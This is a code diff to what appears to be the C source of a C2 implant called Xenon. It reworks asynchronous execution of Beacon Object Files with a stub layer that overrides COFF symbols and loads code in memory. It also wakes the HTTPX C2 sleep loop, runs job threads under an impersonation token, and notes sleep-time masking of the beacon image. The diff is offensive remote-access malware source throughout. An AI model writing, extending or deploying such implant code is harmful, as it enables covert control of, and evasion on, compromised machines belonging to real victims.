@@ -1,4 +1,5 @@
 #include "Tasks/AsyncBof.h"
+#include "Tasks/AsyncStub.h"
 #include "Package.h"
 #include "Parser.h"
 #include "Task.h"
@@ -6,6 +7,7 @@
 #include "Identity.h"
 #include "BeaconCompatibility.h"
 #include "Xenon.h"
+#include "Sleep.h"
 #include "Debug.h"
 
 #include <stdio.h>
@@ -28,6 +30,8 @@ typedef struct _ASYNC_BOF_THREAD_REG {
 
 static PASYNC_BOF_THREAD_REG g_AsyncBofThreadRegs = NULL;
 
+static VOID AsyncBofSyncState(PASYNC_BOF_CONTEXT ctx);
+
 BOOL AsyncBofInitialize(void)
 {
     if (g_AsyncBofManagerInit)
@@ -48,6 +52,9 @@ VOID AsyncBofSignalWakeup(void)
     if (g_AsyncBofWakeup)
         SetEvent(g_AsyncBofWakeup);
 
+    /* Interrupt HTTPX C2 idle (SleepEx alertable wait) */
+    SleepWake();
+
 #if defined(WEBSOCKET_TRANSPORT)
     if (xenonConfig && xenonConfig->WsInboundEvent)
         SetEvent(xenonConfig->WsInboundEvent);
@@ -64,6 +71,7 @@ BOOL AsyncBofHasRunning(void)
 
     EnterCriticalSection(&g_AsyncBofManagerLock);
     for (cur = g_AsyncBofList; cur != NULL; cur = cur->Next) {
+        AsyncBofSyncState(cur);
         /* Keep pumping while jobs run OR still need a final PackageComplete */
         if (cur->state == ASYNC_BOF_STATE_PENDING || cur->state == ASYNC_BOF_STATE_RUNNING) {
             found = TRUE;
@@ -239,6 +247,10 @@ static VOID AsyncBofFlushOutput(PASYNC_BOF_CONTEXT ctx, BOOL complete)
     PPackage locals = NULL;
     PCHAR snapshot = NULL;
     INT snapSize = 0;
+    PCHAR extra = NULL;
+    INT extraSize = 0;
+
+    extraSize = AsyncStubDrain(ctx->stub, &extra);
 
     EnterCriticalSection(&ctx->outputLock);
     if (ctx->outputSize > 0 && ctx->outputBuffer) {
@@ -251,6 +263,30 @@ static VOID AsyncBofFlushOutput(PASYNC_BOF_CONTEXT ctx, BOOL complete)
         AsyncBofClearOutputLocked(ctx);
     }
     LeaveCriticalSection(&ctx->outputLock);
+
+    if (extra && extraSize > 0) {
+        if (snapshot && snapSize > 0) {
+            PCHAR merged = (PCHAR)malloc((SIZE_T)extraSize + (SIZE_T)snapSize + 1);
+            if (merged) {
+                memcpy(merged, extra, extraSize);
+                memcpy(merged + extraSize, snapshot, snapSize);
+                merged[extraSize + snapSize] = '\0';
+                free(extra);
+                free(snapshot);
+                extra = merged;
+                extraSize += snapSize;
+                snapshot = NULL;
+                snapSize = 0;
+            }
+        }
+        if (!snapshot) {
+            snapshot = extra;
+            snapSize = extraSize;
+            extra = NULL;
+        }
+    }
+    if (extra)
+        free(extra);
 
     if (snapshot && snapSize > 0) {
         locals = PackageInit(0, FALSE);
@@ -330,6 +366,11 @@ static VOID AsyncBofCleanupContext(PASYNC_BOF_CONTEXT ctx)
         ctx->entryName = NULL;
     }
 
+    if (ctx->stub) {
+        AsyncStubDestroy(ctx->stub);
+        ctx->stub = NULL;
+    }
+
     EnterCriticalSection(&ctx->outputLock);
     AsyncBofClearOutputLocked(ctx);
     LeaveCriticalSection(&ctx->outputLock);
@@ -342,36 +383,18 @@ static VOID AsyncBofCleanupContext(PASYNC_BOF_CONTEXT ctx)
     LocalFree(ctx);
 }
 
-static DWORD WINAPI AsyncBofThreadProc(LPVOID lpParameter)
+static VOID AsyncBofSyncState(PASYNC_BOF_CONTEXT ctx)
 {
-    PASYNC_BOF_CONTEXT ctx = (PASYNC_BOF_CONTEXT)lpParameter;
-    PCHAR entry = "go";
+    LONG st;
 
-    if (!ctx)
-        return 1;
+    if (!ctx || !ctx->stub)
+        return;
 
-    if (gIdentityToken)
-        ImpersonateLoggedOnUser(gIdentityToken);
-
-    ctx->state = ASYNC_BOF_STATE_RUNNING;
-
-    if (!CoffMap((char*)ctx->coffFile, &ctx->coffRt)) {
+    st = AsyncStubGetState(ctx->stub);
+    if (st == ASYNC_BOF_STATE_RUNNING && ctx->state == ASYNC_BOF_STATE_PENDING)
+        ctx->state = ASYNC_BOF_STATE_RUNNING;
+    if (st == ASYNC_BOF_STATE_FINISHED && ctx->state != ASYNC_BOF_STATE_STOPPED)
         ctx->state = ASYNC_BOF_STATE_FINISHED;
-        AsyncBofSignalWakeup();
-        return 1;
-    }
-
-    if (ctx->entryName && ctx->entryName[0])
-        entry = ctx->entryName;
-
-    CoffExecute(&ctx->coffRt, entry, (char*)ctx->args, ctx->argsSize);
-    CoffUnmap(&ctx->coffRt);
-
-    if (ctx->state != ASYNC_BOF_STATE_STOPPED)
-        ctx->state = ASYNC_BOF_STATE_FINISHED;
-
-    AsyncBofSignalWakeup();
-    return 0;
 }
 
 static PASYNC_BOF_CONTEXT AsyncBofCreate(PCHAR taskUuid, PCHAR entryName, PBYTE coffFile, ULONG coffFileSize, PBYTE args, ULONG argsSize)
@@ -433,15 +456,68 @@ static PASYNC_BOF_CONTEXT AsyncBofCreate(PCHAR taskUuid, PCHAR entryName, PBYTE 
 
 static BOOL AsyncBofStart(PASYNC_BOF_CONTEXT ctx)
 {
+    COFF_SYM_OVERRIDE ov[ASYNC_STUB_MAX_OVERRIDES];
+    INT ovCount = 0;
+    PCHAR entry = "go";
+    void *entryFn;
+    LPTHREAD_START_ROUTINE proc;
+
     if (!ctx)
         return FALSE;
+
+    BeaconCompatibilityEnsureHashes();
+
+    ctx->stub = AsyncStubCreate(
+        ctx->args,
+        ctx->argsSize,
+        ctx->hStopEvent,
+        g_AsyncBofWakeup,
+        SleepThreadHandle(),
+        gIdentityToken);
+    if (!ctx->stub)
+        return FALSE;
+
+    if (!AsyncStubFillOverrides(ctx->stub, ov, ASYNC_STUB_MAX_OVERRIDES, &ovCount)) {
+        AsyncStubDestroy(ctx->stub);
+        ctx->stub = NULL;
+        return FALSE;
+    }
+
+    /* Map while the beacon thread (and image) are unmasked. */
+    if (!CoffMapEx((char*)ctx->coffFile, &ctx->coffRt, ov, ovCount, TRUE)) {
+        AsyncStubDestroy(ctx->stub);
+        ctx->stub = NULL;
+        return FALSE;
+    }
+
+    if (ctx->entryName && ctx->entryName[0])
+        entry = ctx->entryName;
+    entryFn = CoffFindEntry(&ctx->coffRt, entry);
+    if (!entryFn) {
+        CoffUnmap(&ctx->coffRt);
+        AsyncStubDestroy(ctx->stub);
+        ctx->stub = NULL;
+        return FALSE;
+    }
+    AsyncStubSetEntry(ctx->stub, (void (*)(char *, UINT32))entryFn);
+
+    proc = AsyncStubThreadProcAddr(ctx->stub);
+    if (!proc) {
+        CoffUnmap(&ctx->coffRt);
+        AsyncStubDestroy(ctx->stub);
+        ctx->stub = NULL;
+        return FALSE;
+    }
 
     EnterCriticalSection(&g_AsyncBofManagerLock);
 
     /* Suspended until listed/registered so FindByThreadId works before any BeaconPrintf */
-    ctx->hThread = CreateThread(NULL, 0, AsyncBofThreadProc, ctx, CREATE_SUSPENDED, &ctx->threadId);
+    ctx->hThread = CreateThread(NULL, 0, proc, NULL, CREATE_SUSPENDED, &ctx->threadId);
     if (!ctx->hThread) {
         LeaveCriticalSection(&g_AsyncBofManagerLock);
+        CoffUnmap(&ctx->coffRt);
+        AsyncStubDestroy(ctx->stub);
+        ctx->stub = NULL;
         return FALSE;
     }
 
@@ -450,7 +526,6 @@ static BOOL AsyncBofStart(PASYNC_BOF_CONTEXT ctx)
     g_AsyncBofList = ctx;
 
     if (ResumeThread(ctx->hThread) == (DWORD)-1) {
-        /* Unlink; caller cleans up ctx via AsyncBofCleanupContext */
         if (g_AsyncBofList == ctx)
             g_AsyncBofList = ctx->Next;
         ctx->Next = NULL;
@@ -566,6 +641,7 @@ VOID AsyncBofPush(void)
 
     EnterCriticalSection(&g_AsyncBofManagerLock);
     for (cur = g_AsyncBofList; cur != NULL; cur = cur->Next) {
+        AsyncBofSyncState(cur);
         threadAlive = FALSE;
         if (cur->hThread) {
             exitCode = 0;
@@ -594,6 +670,22 @@ VOID AsyncBofPush(void)
             pendingCount++;
             /* Skip */
             continue;
+        }
+
+        if (threadAlive && pendingCount < 32) {
+            PCHAR islandSnap = NULL;
+            INT islandLen = AsyncStubDrain(cur->stub, &islandSnap);
+            if (islandLen > 0 && islandSnap) {
+                memcpy(pending[pendingCount].taskUuid, cur->taskUuid, TASK_UUID_SIZE + 1);
+                pending[pendingCount].data = islandSnap;
+                pending[pendingCount].len = islandLen;
+                pending[pendingCount].complete = FALSE;
+                pending[pendingCount].ctx = NULL;
+                pendingCount++;
+            }
+            else if (islandSnap) {
+                free(islandSnap);
+            }
         }
 
         if (threadAlive && TryEnterCriticalSection(&cur->outputLock)) {
@@ -740,6 +832,7 @@ VOID AsyncBofJobs(PCHAR taskUuid, PPARSER arguments)
 
     EnterCriticalSection(&g_AsyncBofManagerLock);
     for (cur = g_AsyncBofList; cur != NULL; cur = cur->Next) {
+        AsyncBofSyncState(cur);
         switch (cur->state) {
             case ASYNC_BOF_STATE_PENDING:  stateStr = "PENDING"; break;
             case ASYNC_BOF_STATE_RUNNING:  stateStr = "RUNNING"; break;
